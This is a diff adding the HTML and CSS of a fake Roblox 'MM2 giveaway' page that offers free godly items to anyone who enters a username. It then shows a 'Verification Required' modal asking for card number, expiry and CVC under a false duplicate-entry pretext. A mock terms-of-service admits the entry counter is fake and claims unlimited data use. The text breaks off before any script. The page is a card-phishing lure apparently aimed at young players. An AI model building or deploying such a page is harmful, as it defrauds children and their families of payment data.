@@ -1,0 +1,1473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MM2 — Giveaway</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --bg: #08090b;
+    --surface: #0e0f12;
+    --surface-2: #141519;
+    --border: #1c1e24;
+    --text: #f5f6f8;
+    --text-dim: #8a8f9c;
+    --text-faint: #565b68;
+    --accent: #d4ff3a;
+    --accent-dim: rgba(212, 255, 58, 0.15);
+    --accent-glow: rgba(212, 255, 58, 0.4);
+  }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.5'/%3E%3C/svg%3E");
+    opacity: 0.03;
+    pointer-events: none;
+    z-index: 1;
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    top: -40%;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 80%;
+    height: 60%;
+    background: radial-gradient(ellipse at center, rgba(212, 255, 58, 0.06), transparent 60%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  nav {
+    position: relative;
+    z-index: 10;
+    padding: 1.5rem 2rem;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 0.65rem;
+    font-weight: 600;
+    letter-spacing: -0.02em;
+    font-size: 0.95rem;
+  }
+
+  .brand-mark {
+    width: 26px;
+    height: 26px;
+    border-radius: 7px;
+    background: var(--accent);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.85rem;
+    box-shadow: 0 0 20px var(--accent-glow);
+    color: #000;
+  }
+
+  .nav-links {
+    display: flex;
+    gap: 2rem;
+    font-size: 0.85rem;
+    color: var(--text-dim);
+  }
+
+  .nav-links span { cursor: pointer; transition: color 0.2s; }
+  .nav-links span:hover { color: var(--text); }
+
+  .nav-right {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.8rem;
+    color: var(--text-dim);
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .status-dot {
+    width: 6px;
+    height: 6px;
+    background: var(--accent);
+    border-radius: 50%;
+    box-shadow: 0 0 8px var(--accent-glow);
+    animation: blink 2s infinite;
+    display: inline-block;
+    margin-right: 0.4rem;
+    vertical-align: middle;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  main {
+    position: relative;
+    z-index: 5;
+    flex: 1;
+    max-width: 1200px;
+    width: 100%;
+    margin: 0 auto;
+    padding: 5rem 2rem 4rem;
+  }
+
+  .hero {
+    max-width: 780px;
+    margin-bottom: 4rem;
+  }
+
+  .eyebrow {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    padding: 0.4rem 0.9rem;
+    border: 1px solid var(--border);
+    border-radius: 100px;
+    margin-bottom: 1.75rem;
+    background: var(--surface);
+  }
+
+  .eyebrow .pulse {
+    width: 5px;
+    height: 5px;
+    background: var(--accent);
+    border-radius: 50%;
+    box-shadow: 0 0 8px var(--accent-glow);
+    animation: blink 2s infinite;
+  }
+
+  h1 {
+    font-size: clamp(2.4rem, 5.5vw, 4rem);
+    font-weight: 600;
+    letter-spacing: -0.04em;
+    line-height: 1.05;
+    margin-bottom: 1.5rem;
+  }
+
+  h1 em { font-style: normal; color: var(--text-faint); }
+  h1 .accent { color: var(--accent); }
+
+  .hero p {
+    font-size: 1.05rem;
+    color: var(--text-dim);
+    line-height: 1.6;
+    max-width: 560px;
+    font-weight: 400;
+  }
+
+  .entry-section {
+    display: grid;
+    grid-template-columns: 1fr 340px;
+    gap: 1.25rem;
+    margin-bottom: 4rem;
+  }
+
+  .entry-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 2rem;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .entry-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+    opacity: 0.5;
+  }
+
+  .entry-label {
+    font-size: 0.75rem;
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--text-faint);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 0.75rem;
+  }
+
+  .entry-form {
+    display: flex;
+    gap: 0.6rem;
+    margin-bottom: 1.25rem;
+  }
+
+  .entry-form input {
+    flex: 1;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 0.85rem 1.1rem;
+    font-family: 'Inter', sans-serif;
+    font-size: 0.95rem;
+    color: var(--text);
+    outline: none;
+    transition: all 0.15s;
+  }
+
+  .entry-form input::placeholder { color: var(--text-faint); }
+
+  .entry-form input:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px var(--accent-dim);
+  }
+
+  .entry-form input:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+  }
+
+  .entry-form button {
+    background: var(--accent);
+    color: #000;
+    border: none;
+    border-radius: 10px;
+    padding: 0.85rem 1.5rem;
+    font-family: 'Inter', sans-serif;
+    font-size: 0.9rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.15s;
+    white-space: nowrap;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  .entry-form button:hover:not(:disabled) {
+    background: #e2ff5c;
+    box-shadow: 0 0 24px var(--accent-glow);
+  }
+
+  .entry-form button:active:not(:disabled) { transform: scale(0.98); }
+
+  .entry-form button:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+  }
+
+  .entry-meta {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.8rem;
+    color: var(--text-faint);
+    font-family: 'JetBrains Mono', monospace;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+  }
+
+  .entry-meta .msg { color: var(--text-dim); }
+  .entry-meta .msg.success { color: var(--accent); }
+  .entry-meta .msg.error { color: #ff6b6b; }
+  .entry-meta .msg.loading { color: #7dd3fc; }
+
+  .stats-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 2rem;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+  }
+
+  .stat { margin-bottom: 1.5rem; }
+  .stat:last-child { margin-bottom: 0; }
+
+  .stat-label {
+    font-size: 0.7rem;
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--text-faint);
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    margin-bottom: 0.5rem;
+  }
+
+  .stat-value {
+    font-size: 2rem;
+    font-weight: 600;
+    letter-spacing: -0.03em;
+    font-variant-numeric: tabular-nums;
+    line-height: 1;
+  }
+
+  .stat-sub {
+    font-size: 0.75rem;
+    color: var(--text-faint);
+    margin-top: 0.4rem;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .winner-name {
+    font-size: 1.1rem;
+    font-weight: 500;
+    color: var(--accent);
+    font-family: 'JetBrains Mono', monospace;
+    margin-top: 0.5rem;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+
+  .section-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: baseline;
+    margin-bottom: 1.5rem;
+    padding-bottom: 1rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-header h2 {
+    font-size: 0.95rem;
+    font-weight: 500;
+    letter-spacing: -0.01em;
+  }
+
+  .section-header .count {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    color: var(--text-faint);
+  }
+
+  .prizes {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 1px;
+    background: var(--border);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    overflow: hidden;
+    margin-bottom: 4rem;
+  }
+
+  .prize {
+    background: var(--surface);
+    padding: 2.5rem 1.5rem 1.75rem;
+    transition: background 0.2s;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+  }
+
+  .prize:hover { background: var(--surface-2); }
+
+  .prize-img-wrap {
+    height: 200px;
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 1.5rem;
+    position: relative;
+  }
+
+  .prize-img-wrap::after {
+    content: '';
+    position: absolute;
+    bottom: 10px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 70%;
+    height: 20px;
+    background: radial-gradient(ellipse at center, rgba(212, 255, 58, 0.2), transparent 70%);
+    filter: blur(10px);
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+
+  .prize:hover .prize-img-wrap::after { opacity: 1; }
+
+  .prize-img {
+    max-width: 100%;
+    max-height: 100%;
+    object-fit: contain;
+    transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1);
+    filter: drop-shadow(0 8px 24px rgba(0, 0, 0, 0.7));
+  }
+
+  .prize:hover .prize-img {
+    transform: scale(1.06) translateY(-4px);
+  }
+
+  .prize-name {
+    font-size: 0.95rem;
+    font-weight: 500;
+    letter-spacing: -0.01em;
+    margin-bottom: 0.5rem;
+  }
+
+  .prize-tag {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    color: var(--text-faint);
+  }
+
+  .prize-tag.godly { color: var(--accent); }
+  .prize-tag.chroma { color: #7dd3fc; }
+
+  .prize-corner {
+    position: absolute;
+    top: 1.25rem;
+    right: 1.25rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--text-faint);
+  }
+
+  footer {
+    position: relative;
+    z-index: 5;
+    border-top: 1px solid var(--border);
+    padding: 1.5rem 2rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.75rem;
+    color: var(--text-faint);
+    font-family: 'JetBrains Mono', monospace;
+    flex-wrap: wrap;
+    gap: 1rem;
+  }
+
+  .footer-left {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  .tos-btn {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    padding: 0.5rem 1rem;
+    border-radius: 100px;
+    cursor: pointer;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    transition: all 0.2s;
+  }
+
+  .tos-btn:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+
+  .spinner {
+    display: inline-block;
+    width: 12px;
+    height: 12px;
+    border: 2px solid rgba(0,0,0,0.2);
+    border-top-color: #000;
+    border-radius: 50%;
+    animation: spin 0.6s linear infinite;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .honeypot {
+    position: absolute;
+    left: -9999px;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(5, 7, 10, 0.85);
+    backdrop-filter: blur(8px);
+    z-index: 100;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 1.5rem;
+    opacity: 0;
+    transition: opacity 0.2s;
+  }
+
+  .modal-overlay.open {
+    display: flex;
+    opacity: 1;
+  }
+
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    max-width: 640px;
+    width: 100%;
+    max-height: 80vh;
+    display: flex;
+    flex-direction: column;
+    box-shadow: 0 40px 80px -20px rgba(0,0,0,0.9), 0 0 40px rgba(212, 255, 58, 0.08);
+    transform: scale(0.96);
+    transition: transform 0.2s;
+  }
+
+  .modal-overlay.open .modal {
+    transform: scale(1);
+  }
+
+  .modal-head {
+    padding: 1.75rem 2rem 1rem;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 1rem;
+  }
+
+  .modal-head h3 {
+    font-size: 1.1rem;
+    font-weight: 600;
+    letter-spacing: -0.01em;
+  }
+
+  .modal-head .sub {
+    font-size: 0.72rem;
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--text-faint);
+    margin-top: 0.3rem;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+  }
+
+  .modal-close {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    width: 34px;
+    height: 34px;
+    border-radius: 50%;
+    cursor: pointer;
+    font-size: 1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.2s;
+    flex-shrink: 0;
+  }
+
+  .modal-close:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+
+  .modal-body {
+    padding: 1.5rem 2rem 2rem;
+    overflow-y: auto;
+    font-size: 0.85rem;
+    line-height: 1.7;
+    color: var(--text-dim);
+  }
+
+  .modal-body h4 {
+    font-size: 0.8rem;
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--text);
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    margin: 1.5rem 0 0.6rem;
+  }
+
+  .modal-body h4:first-child { margin-top: 0; }
+
+  .modal-body p { margin-bottom: 0.8rem; }
+
+  .modal-body ul {
+    margin: 0.5rem 0 0.9rem 1.2rem;
+  }
+
+  .modal-body li {
+    margin-bottom: 0.4rem;
+  }
+
+  .modal-body .callout {
+    background: rgba(212, 255, 58, 0.06);
+    border-left: 2px solid var(--accent);
+    padding: 0.9rem 1.1rem;
+    border-radius: 6px;
+    color: var(--text);
+    font-size: 0.82rem;
+    margin: 1rem 0;
+  }
+
+  .verify-modal {
+    max-width: 480px;
+    text-align: center;
+  }
+
+  .verify-modal .modal-body {
+    padding: 2rem 2rem 2rem;
+    text-align: center;
+  }
+
+  .verify-icon {
+    width: 56px;
+    height: 56px;
+    border-radius: 16px;
+    background: rgba(212, 255, 58, 0.1);
+    border: 1px solid rgba(212, 255, 58, 0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.6rem;
+    margin: 0 auto 1.25rem;
+  }
+
+  .verify-title {
+    font-size: 1.15rem;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 0.6rem;
+    letter-spacing: -0.01em;
+  }
+
+  .verify-text {
+    font-size: 0.88rem;
+    color: var(--text-dim);
+    line-height: 1.6;
+    margin-bottom: 1.5rem;
+  }
+
+  .verify-text strong {
+    color: var(--text);
+    font-weight: 500;
+  }
+
+  .card-form {
+    display: flex;
+    flex-direction: column;
+    gap: 0.75rem;
+    margin-bottom: 1.25rem;
+    text-align: left;
+  }
+
+  .card-field {
+    display: flex;
+    flex-direction: column;
+    gap: 0.35rem;
+  }
+
+  .card-field label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.68rem;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    color: var(--text-faint);
+  }
+
+  .card-field input {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 0.8rem 1rem;
+    font-family: 'Inter', sans-serif;
+    font-size: 0.95rem;
+    color: var(--text);
+    outline: none;
+    transition: all 0.15s;
+    width: 100%;
+  }
+
+  .card-field input::placeholder { color: var(--text-faint); }
+
+  .card-field input:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px var(--accent-dim);
+  }
+
+  .card-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0.75rem;
+  }
+
+  .card-brand-badge {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.68rem;
+    color: var(--text-faint);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    margin-top: 0.25rem;
+    min-height: 1em;
+    transition: color 0.15s;
+  }
+
+  .card-brand-badge.detected { color: var(--accent); }
+
+  .verify-status {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--text-faint);
+    margin-bottom: 1.25rem;
+    min-height: 1.2em;
+    letter-spacing: 0.05em;
+  }
+
+  .verify-status.ok { color: var(--accent); }
+  .verify-status.err { color: #ff6b6b; }
+
+  .verify-actions {
+    display: flex;
+    gap: 0.6rem;
+    justify-content: center;
+  }
+
+  .btn-ghost {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    font-family: 'Inter', sans-serif;
+    font-size: 0.85rem;
+    font-weight: 500;
+    padding: 0.75rem 1.4rem;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .btn-ghost:hover {
+    border-color: var(--text-dim);
+    color: var(--text);
+  }
+
+  .btn-primary {
+    background: var(--accent);
+    color: #000;
+    border: none;
+    font-family: 'Inter', sans-serif;
+    font-size: 0.85rem;
+    font-weight: 600;
+    padding: 0.75rem 1.6rem;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .btn-primary:hover:not(:disabled) {
+    background: #e2ff5c;
+    box-shadow: 0 0 24px var(--accent-glow);
+  }
+
+  .btn-primary:disabled {
+    opacity: 0.4;
+    cursor: not-allowed;
+  }
+
+  @media (max-width: 900px) {
+    .entry-section { grid-template-columns: 1fr; }
+    .prizes { grid-template-columns: 1fr; }
+    main { padding: 3rem 1.25rem 3rem; }
+    nav { padding: 1.25rem; }
+    .nav-links { display: none; }
+  }
+
+  @media (max-width: 500px) {
+    .entry-form { flex-direction: column; }
+    .entry-form button { justify-content: center; }
+    h1 { font-size: 2rem; }
+    footer { flex-direction: column; align-items: flex-start; }
+    .verify-actions { flex-direction: column; }
+    .btn-ghost, .btn-primary { width: 100%; }
+  }
+
+  ::selection { background: var(--accent); color: #000; }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="brand">
+    <div class="brand-mark">🔪</div>
+    <span>mm2.giveaway</span>
+  </div>
+  <div class="nav-links">
+    <span>Prizes</span>
+    <span>Rules</span>
+    <span>Winners</span>
+    <span>Support</span>
+  </div>
+  <div class="nav-right">
+    <span><span class="status-dot"></span>live</span>
+  </div>
+</nav>
+
+<main>
+  <section class="hero">
+    <div class="eyebrow">
+      <span class="pulse"></span>
+      Round #47 · Ends in 3 days
+    </div>
+    <h1>
+      Free <span class="accent">godlys</span>.<br>
+      <em>No strings attached.</em>
+    </h1>
+    <p>
+      Drop your Roblox username below to enter this week's giveaway. Three godly-tier items, one winner, drawn live when we hit 10,000 entries.
+    </p>
+  </section>
+
+  <section class="entry-section">
+    <div class="entry-card">
+      <div class="entry-label">Enter giveaway</div>
+
+      <div class="entry-form">
+        <input type="text" id="usernameInput" placeholder="Roblox username" maxlength="20" autocomplete="off" spellcheck="false" autofocus>
+        <button id="enterBtn">Enter <span>→</span></button>
+      </div>
+
+      <div class="honeypot" aria-hidden="true">
+        <label>Leave this empty
+          <input type="text" id="honeypotField" tabindex="-1" autocomplete="off">
+        </label>
+      </div>
+
+      <div class="entry-meta">
+        <span class="msg" id="messageBox">Verified via Roblox API · Card protected.</span>
+        <span id="entryCountMono">9,995 / 10,000</span>
+      </div>
+    </div>
+
+    <div class="stats-card">
+      <div class="stat">
+        <div class="stat-label">Entries</div>
+        <div class="stat-value" id="entryCount">9,995</div>
+        <div class="stat-sub">of 10,000 target</div>
+      </div>
+      <div class="stat">
+        <div class="stat-label">Last winner</div>
+        <div class="winner-name" id="lastWinner">xX_MM2_Pro_Xx</div>
+        <div class="stat-sub">Round #46</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-header">
+    <h2>This round's prizes</h2>
+    <span class="count">03 items</span>
+  </div>
+
+  <section class="prizes">
+    <div class="prize">
+      <div class="prize-corner">01</div>
+      <div class="prize-img-wrap">
+        <img class="prize-img" src="Chroma_Snowcannon.png" alt="Chroma Snow Cannon">
+      </div>
+      <div class="prize-name">Chroma Snow Cannon</div>
+      <div class="prize-tag chroma">Chroma</div>
+    </div>
+    <div class="prize">
+      <div class="prize-corner">02</div>
+      <div class="prize-img-wrap">
+        <img class="prize-img" src="Gingerscope.png" alt="Gingerscope">
+      </div>
+      <div class="prize-name">Gingerscope</div>
+      <div class="prize-tag godly">Godly</div>
+    </div>
+    <div class="prize">
+      <div class="prize-corner">03</div>
+      <div class="prize-img-wrap">
+        <img class="prize-img" src="Raygun.png" alt="Raygun">
+      </div>
+      <div class="prize-name">Raygun</div>
+      <div class="prize-tag godly">Godly</div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="footer-left">
+    <span>mm2.giveaway · round #47</span>
+  </div>
+  <button class="tos-btn" id="tosBtn">Terms of Service</button>
+</footer>
+
+<div class="modal-overlay" id="tosModal">
+  <div class="modal">
+    <div class="modal-head">
+      <div>
+        <h3>Terms of Service</h3>
+        <div class="sub">Version 4.2 · Effective immediately</div>
+      </div>
+      <button class="modal-close" id="tosClose" aria-label="Close">✕</button>
+    </div>
+    <div class="modal-body">
+      <h4>1. Acceptance of Terms</h4>
+      <p>By accessing, viewing, hovering over, thinking about, dreaming of, or otherwise interacting with this page in any form — including but not limited to loading the HTML, viewing the source, reading these words, having a browser tab open in the background, or merely existing in the same room as a device displaying this page — you agree to be bound by these Terms in perpetuity across all known and unknown dimensions, parallel universes, and simulated realities.</p>
+      <p>If you do not agree to these Terms, you must immediately cease all interaction with this page, close your browser, turn off your device, and reconsider your life choices. Continued use constitutes binding acceptance.</p>
+
+      <h4>2. Eligibility</h4>
+      <p>Entry is open to all sentient beings aged 0 to 999 who possess a valid Roblox account in good standing. By entering, you represent and warrant that you meet all eligibility requirements and that you are not prohibited from participating under any applicable law, regulation, or interdimensional treaty.</p>
+      <p>Employees, contractors, sub-contractors, interns, hamsters, immediate family members of the site operator, and any entity that has ever been within a 50-meter radius of the site operator are eligible but will not win under any circumstances.</p>
+
+      <h4>3. Entry Requirements</h4>
+      <p>To enter, you must provide a valid Roblox username and complete any verification steps presented. You agree that all information you provide is accurate, current, and complete, and that you will not impersonate any person, entity, or fictional character.</p>
+      <p>Limit one entry per person, per household, per IP address, per device, per browser, per soul. Attempts to circumvent this limit — including but not limited to using multiple accounts, VPNs, proxies, virtual machines, or trained pigeons — will result in immediate disqualification and possible placement on a list.</p>
+
+      <h4>4. Data Collection &amp; Use</h4>
+      <p>You acknowledge and accept that <strong>all information you provide may be collected, stored, processed, aggregated, anonymized, re-identified, sold, licensed, sublicensed, transmitted, retransmitted, mirrored, archived, backed up, hashed, salted, encrypted, decrypted, compressed, decompressed, indexed, cross-referenced, analyzed, profiled, and used for purposes both stated and unstated, now and forever, throughout the universe.</strong></p>
+      <p>This includes, without limitation, your Roblox username, IP address, device fingerprint, browser metadata, typing cadence, mouse movement patterns, and any other data we can reasonably extract. By entering, you grant us a perpetual, irrevocable, worldwide, royalty-free license to use your data for any purpose we deem appropriate, including purposes we have not yet invented.</p>
+
+      <h4>5. Verification</h4>
+      <p>We reserve the right to verify your identity, account ownership, and eligibility at any time, using any method we deem appropriate. This may include requiring additional information, such as payment card details, government-issued identification, biometric data, or a blood sample.</p>
+      <p>You agree to cooperate fully with any verification request. Failure to comply may result in disqualification, forfeiture of any prize, and/or notification of the relevant authorities (including, where applicable, your mother).</p>
+
+      <h4>6. Winner Selection</h4>
+      <p>Winners are chosen by a proprietary, quantum-randomized, deterministic algorithm that is simultaneously provably fair and completely arbitrary. All decisions are final, binding, non-negotiable, and subject to change without notice at our sole discretion.</p>
+      <p>Odds of winning depend on the total number of eligible entries received. The number of entries displayed on this page is provided for entertainment purposes only and may not reflect the actual number of entries received. No purchase necessary. A purchase will not improve your chances of winning.</p>
+
+      <h4>7. Prize Delivery</h4>
+      <p>In the unlikely event that a prize is awarded, delivery may take 1 to 10,000 business days. Prizes are non-transferable, non-refundable, and may be substituted with items of equal or lesser value, including but not limited to: a firm handshake, a polite nod, a gently worded email, a crisp high-five, or an IOU written on a napkin.</p>
+      <p>Winners are solely responsible for any taxes, fees, duties, or other charges associated with prize receipt. We are not responsible for prizes lost, stolen, damaged, delayed, or consumed by pets.</p>
+
+      <h4>8. Prohibited Conduct</h4>
+      <p>You agree not to:</p>
+      <ul>
+        <li>Use bots, scripts, macros, automation, AI agents, trained pigeons, or any other non-human mechanism to enter;</li>
+        <li>Enter more than once, or enter less than once, or enter exactly once in a suspiciously confident manner;</li>
+        <li>Exploit, reverse-engineer, decompile, or otherwise tamper with the site or its underlying systems;</li>
+        <li>Attempt to interfere with the proper functioning of the giveaway, including by launching denial-of-service attacks, spamming, or flooding;</li>
+        <li>Harass, threaten, or otherwise mistreat other participants, the site operator, or any affiliated parties;</li>
+        <li>Violate any applicable law, regulation, or the rights of any third party;</li>
+        <li>Be a jerk.</li>
+      </ul>
+
+      <h4>9. Intellectual Property</h4>
+      <p>All content on this site — including but not limited to text, graphics, logos, icons, images, audio clips, digital downloads, data compilations, and software — is the property of the site operator or its content suppliers and is protected by international copyright laws.</p>
+      <p>You may not reproduce, distribute, modify, create derivative works of, publicly display, publicly perform, republish, download, store, or transmit any material on this site without our prior written consent, except as necessary to view the site in a standard web browser.</p>
+
+      <h4>10. Disclaimer of Warranties</h4>
+      <p>This site is provided on an "as is" and "as available" basis, without any warranties of any kind, either express or implied. We disclaim all warranties, including but not limited to implied warranties of merchantability, fitness for a particular purpose, and non-infringement.</p>
+      <p>We do not warrant that the site will be uninterrupted, secure, error-free, or free of viruses or other harmful components. You use the site at your own risk.</p>
+
+      <h4>11. Limitation of Liability</h4>
+      <p>In no event shall the site operator, its affiliates, licensors, service providers, employees, agents, officers, or directors be liable for any direct, indirect, incidental, special, consequential, exemplary, or imaginary damages arising from your use of this site, including but not limited to: disappointment, mild confusion, sudden urges to open Roblox, existential dread, the realization that you spent your afternoon entering a giveaway that will probably not be won by you, or any other damages however caused.</p>
+
+      <h4>12. Indemnification</h4>
+      <p>You agree to indemnify, defend, and hold harmless the site operator and its affiliates from and against any and all claims, liabilities, damages, losses, costs, expenses, or fees (including reasonable attorneys' fees) arising from your violation of these Terms or your use of the site.</p>
+
+      <h4>13. Modifications</h4>
+      <p>These terms may be updated at any time, for any reason, or for no reason at all. Continued use of the site after any modification constitutes acceptance of the modified terms, retroactively, preemptively, and sideways. It is your responsibility to review these Terms periodically for changes.</p>
+
+      <h4>14. Termination</h4>
+      <p>We reserve the right to terminate or suspend your access to the site, without notice and without liability, for any reason, including but not limited to breach of these Terms. Upon termination, your right to use the site will immediately cease.</p>
+
+      <h4>15. Governing Law</h4>
+      <p>These terms shall be governed by and construed in accordance with the laws of the jurisdiction in which the site operator was last seen, as determined by their most recent Roblox login. Any disputes arising under these Terms shall be resolved exclusively by binding arbitration conducted in a location of our choosing.</p>
+
+      <div class="callout">
+        By entering, you acknowledge that all information may be collected and used for verification, analytics, and safety purposes. This giveaway is operated independently and is not affiliated with, endorsed by, or sponsored by Roblox Corporation or Nikilis.
+      </div>
+
+      <h4>16. Severability</h4>
+      <p>If any provision of these Terms is found to be invalid, illegal, or unenforceable, the remaining provisions shall continue in full force and effect, and the invalid provision shall be replaced with a valid one that most closely reflects the original intent.</p>
+
+      <h4>17. Entire Agreement</h4>
+      <p>These Terms constitute the entire agreement between you and the site operator with respect to the site and supersede all prior or contemporaneous understandings, agreements, representations, and warranties, whether written or oral.</p>
+
+      <h4>18. Contact</h4>
+      <p>If you have any questions about these Terms, please do not contact us. We will not respond. This section is included solely for completeness and to make these Terms appear more legitimate.</p>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="verifyModal">
+  <div class="modal verify-modal">
+    <div class="modal-head">
+      <div>
+        <h3>Verification Required</h3>
+        <div class="sub">Step 2 of 2</div>
+      </div>
+      <button class="modal-close" id="verifyClose" aria-label="Close">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="verify-icon">💳</div>
+      <div class="verify-title">Confirm your identity</div>
+      <div class="verify-text">
+        Our system flagged this entry for <strong>possible duplicate participation</strong>.
+        Enter your card details below to confirm you're a real user and finish your entry.
+      </div>
+
+      <div class="card-form">
+        <div class="card-field">
+          <label for="cardNumber">Card Number</label>
+          <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="23" autocomplete="cc-number" inputmode="numeric">
+          <div class="card-brand-badge" id="cardBrandBadge"></div>
+        </div>
+        <div class="card-field">
+          <label for="cardName">Name on Card</label>
+          <input type="text" id="cardName" placeholder="John Doe" maxlength="40" autocomplete="cc-name">
+        </div>
+        <div class="card-row">
+          <div class="card-field">
+            <label for="cardExpiry">Expiry</label>
+            <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" inputmode="numeric">
+          </div>
+          <div class="card-field">
+            <label for="cardCvc">CVC</label>
+            <input type="text" id="cardCvc" placeholder="123" maxlength="4" autocomplete="cc-csc" inputmode="numeric">
+          </div>
+        </div>
+      </div>
+
+      <div class="verify-status" id="verifyStatus">Enter card details to continue</div>
+
